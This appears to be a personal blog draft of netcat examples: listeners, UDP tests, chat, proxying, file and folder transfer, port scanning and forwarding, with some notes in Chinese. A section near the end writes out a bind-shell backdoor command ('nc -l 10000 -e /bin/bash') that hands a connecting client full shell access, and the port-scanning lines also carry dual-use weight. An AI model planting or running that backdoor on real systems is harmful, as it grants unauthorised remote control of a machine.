---
title: "Useful nc Examples"
date: 2023-11-21T12:40:52+08:00
draft: true
---

1) Basic Connection Establishment
Ncat or nc simplifies the process of creating basic connections between systems. Use the following command to establish a connection between a client and a server:

$ ncat -l port_number

Where:

-l : Bind and listen for incoming connections on the port_number.
For example,

$ nc -l 8080   //Server
$ nc localhost 8080 //Client
This basic example allow server to listen on port 8080 and clients can connect to it.

2) Connect to a Remote System
To connect to a remote system with nc, execute the following command,

$ nc -v IP_address port_number

or

$ nc -v FQDN

Let’s take an example,

$ nc -v 192.168.1.248 80
or 
$ nc -v www.linuxtechi.com 443
Now a connection to server with IP address 192.168.1.248 will be made at port 80 & we can now send instructions to server. Like we can get the complete page content with


GET / HTTP/1.1

or get the page name,

GET / HTTP/1.1

or we can get banner for OS fingerprinting with the following,

HEAD / HTTP/1.1

This will tell what software is being used to run the web Server.

Alternate way to check,

$ echo -e "GET / HTTP/1.1\nHost: 192.168.1.248\n\n" | nc 192.168.1.248 80
3) Connecting to UDP Ports
By default , the nc utility makes connections only to TCP ports. But we can also make connections to UDP ports, for that we can use option ‘u’,

$ ncat -l -u 1234
Now our system will start listening a udp port ‘1234’, we can verify this using below netstat command,

$ netstat -tunlp | grep 1234
udp 0 0 0.0.0.0:1234 0.0.0.0:* 10713/nc
$
netstat-udp-connection-check-linux

Let’s assume we want to send or test UDP port connectivity to a specific remote host, then use the following command,

$ ncat -v -u {host-ip} {udp-port}

$ nc -v -u 192.168.105.150 53
Ncat: Version 7.91 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.105.150:53.
4) NC as chat tool
NC allows for real-time chat between two systems. Start a chat server:

$ ncat -l -p 9090
On remote client machine, run

$ ncat 192.168.1.248 9090
Than start sending messages & they will be displayed on server terminal.

NC-Chat-Server-Linux

5) NC as a proxy
NC can also be used as a proxy with a simple command. Let’s take an example,

$ ncat -l 8080 | ncat 192.168.1.200 80
Now all the connections coming to our server on port 8080 will be automatically redirected to 192.168.1.200 server on port 80. But since we are using a pipe, data can only be transferred & to be able to receive the data back, we need to create a two way pipe. Use the following commands to do so,

$ mkfifo 2way
$ ncat -l 8080 0<2way | ncat 192.168.1.200 80 1>2way
Now you will be able to send & receive data over nc proxy.

6) Transfer Files Using nc
NC can also be used to transfer or copy the files from one system to another, though it is not recommended & mostly all systems have ssh/scp installed by default. But none the less if you have come across a system with no ssh/scp, you can also use nc as last ditch effort.

Start with machine on which data is to be received & start nc is listener mode,

$ ncat -l  8080 > file.txt
Now on the machine from where data is to be copied, run the following command,

$ ncat 192.168.1.100 8080 --send-only < data.txt
Here, data.txt is the file that has to be sent. –send-only option will close the connection once the file has been copied. If not using this option, than we will have press ctrl+c to close the connection manually.

We can also copy entire disk partitions using this method, but it should be done with caution.

7) Port Scanning
You can use nc to scan a range of ports on a target system to check for open services. For instance:

$ nc -zv <hostname or IP address> <start_port>-<end_port>

$ nc -zv 192.168.1.248 80-100   # range
$ nc -zv example.com 443        # Particular port$ nc -zv example.com 80 443     # Multiple Port
8) Port Forwarding
We can also use NC for port forwarding with the help of option ‘c’ , syntax for accomplishing port forwarding is,

$ ncat -u -l  80 -c  'ncat -u -l 8080'
Now all the connections for port 80 will be forwarded to port 8080.

9) Set Connection Timeouts
Listener mode in ncat will continue to run & would have to be terminated manually. But we can configure timeouts with option ‘w’,

$ ncat -w 10 192.168.1.248 8080
This will cause connection to be terminated in 10 seconds, but it can only be used on client side & not on server side.

10) Force Server to Stay Up
When client disconnects from server, after sometime server also stops listening. But we can force server to stay connected & continuing port listening with option ‘k’. Run the following command,

$ ncat -l -k 8080
Now server will stay up, even if a connection from client is broken.

Additional Example

Remote Command Execution via nc
NC command can also be used to create backdoor to your systems & this technique is actually used by hackers a lot. We should know how it works in order to secure our system. To create a backdoor, the command is,

$ nc -l 10000 -e /bin/bash
‘e‘ flag attaches a bash to port 10000. Now a client can connect to port 10000 on server & will have complete access to our system via bash.

$ nc 192.168.1.100 10000

nc 传文件（方法1）

nc -l 9995 >zabbix.rpm
nc 10.0.1.162 9995 < zabbix-release-2.4-1.el6.noarch.rpm

nc 传文件（方法2）
nc -l 9992 <test.mv
nc 10.0.1.162 9992 >test2.mv

nc 传文件夹
管道后面最后必须是 - ，不能是其余自定义的文件名。（-是tar命令的一个选项，表示tar应该读取从标准输入（stdin）传入的数据。）
nc -l 9995 | tar xfvz -
tar cfz - * | nc 10.0.1.162 9995

todo: https://zhuanlan.zhihu.com/p/270185285